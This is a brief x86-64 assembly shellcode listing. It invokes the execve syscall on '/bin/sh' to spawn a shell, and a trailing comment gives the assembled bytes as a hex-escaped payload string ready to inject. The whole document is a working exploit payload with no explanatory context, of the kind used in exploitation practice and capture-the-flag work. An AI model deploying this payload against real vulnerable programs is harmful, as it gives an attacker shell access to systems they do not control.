.global _start
_start:
.intel_syntax noprefix
       mov rax,59
       lea rdi, [rip+sh]
       mov rsi, 0
       mov rdx, 0
       syscall
sh:
       .string "/bin/sh"
       
# "\48\c7\c0\3b\00\00\00\48\8d\3d\10\00\00\00\48\c7\c6\00\00\00\00\48\c7\c2\00\00\00\00\0f\05\2f\62\69\6e\2f\73\68\00\0a"
